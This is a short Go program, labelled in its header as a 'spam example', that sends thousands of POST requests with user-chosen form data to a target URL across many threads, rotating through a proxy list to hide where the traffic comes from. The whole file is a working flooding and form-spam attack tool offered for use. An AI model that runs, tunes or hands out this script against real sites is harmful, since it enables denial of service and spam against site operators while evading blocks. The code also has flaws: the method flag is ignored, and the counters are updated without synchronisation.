/**
	* hope it helps u 							 *
	* By Nikita Vtorushin <n.vtorushin@inbox.ru> *
	* @https://t.me/nvtorushin 					 *
	* GoLang spam example OSINT      			 *
**/

package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var completeCount = 0
var errorCount = 0

type any interface{}

func main() {
	attackUrl := flag.String("url", "", "attackUrl spam attack")
	method := flag.String("method", "POST", "method for attack (POST/GET)")
	count := flag.Int("count", 10000, "count for attack")
	data := flag.String("data", ``, "data for attack")
	proxyFile := flag.String("proxyfile", "", "file containing proxies (one per line)")
	threads := flag.Int("threads", 1, "number of threads for attack")
	flag.Parse()

	var requestData url.Values

	if *attackUrl != "" {

		if *data != "" {
			requestData = getData(*method, *data)
		}

		var proxies []string
		if *proxyFile != "" {
			proxies = readProxiesFromFile(*proxyFile)
		}

		rand.Seed(time.Now().UnixNano())
		totalRequests := *count

		var wg sync.WaitGroup
		wg.Add(*threads)

		for i := 1; i <= *threads; i++ {
			go runAttacks(*attackUrl, *method, requestData, proxies, totalRequests, i, &wg)
		}

		wg.Wait()

		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
	} else {
		fmt.Println("Set variable -url")
	}
}

func runAttacks(attackUrl string, method string, data url.Values, proxies []string, count int, threadIndex int, wg *sync.WaitGroup) {
	defer wg.Done()

	for i := 0; i < count; i++ {
		if i%5 == 0 {
			fmt.Println("Thread", threadIndex, "Good:", completeCount, "Bad:", errorCount)
		}
		startAttack(attackUrl, method, data, proxies, threadIndex)
	}
}

func startAttack(attackUrl string, method string, data url.Values, proxies []string, threadIndex int) {
	client := &http.Client{}

	// Проверяем наличие прокси перед использованием
	if len(proxies) > 0 {
		// Выбираем прокси циклически, основываясь на уникальном индексе потока
		proxyIndex := (threadIndex - 1) % len(proxies)

		// Добавляем поддержку прокси, если указано
		proxy := proxies[proxyIndex]
		if proxy != "" {
			proxyUrl, err := url.Parse(proxy)
			if err == nil {
				client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyUrl)}
			} else {
				fmt.Println("Error parsing proxy URL:", err)
				return
			}
		}
	}

	resp, err := client.PostForm(attackUrl, data)

	if err != nil {
		fmt.Println("Site not available:", attackUrl, "\nERROR:", err)
		errorCount++
	} else {
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)

		req := string(body)
		_ = req

		if err != nil || resp.StatusCode != 200 {
			if err != nil {
				log(err)
			} else {
				log(req)
			}
			errorCount++
		} else {
			completeCount++
		}
	}
}

func log(data any) {
	fmt.Println(data)
}

func getData(method string, data string) url.Values {
	log(method)
	if method == "POST" || method == "post" {
		var body = []byte(data)
		return getFormatPostData(body)
	} else {
		return nil
	}
}

func getFormatPostData(body []byte) url.Values {
	m := map[string]string{}
	if err := json.Unmarshal(body, &m); err != nil {
		panic(err)
	}
	_body := url.Values{}
	for key, val := range m {
		_body.Add(key, val)
	}

	return _body
}

func readProxiesFromFile(file string) []string {
	var proxies []string
	f, err := os.Open(file)
	if err != nil {
		fmt.Println("Error opening proxy file:", err)
		return proxies
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading proxy file:", err)
	}

	return proxies
}

func getFormatGetData() {}
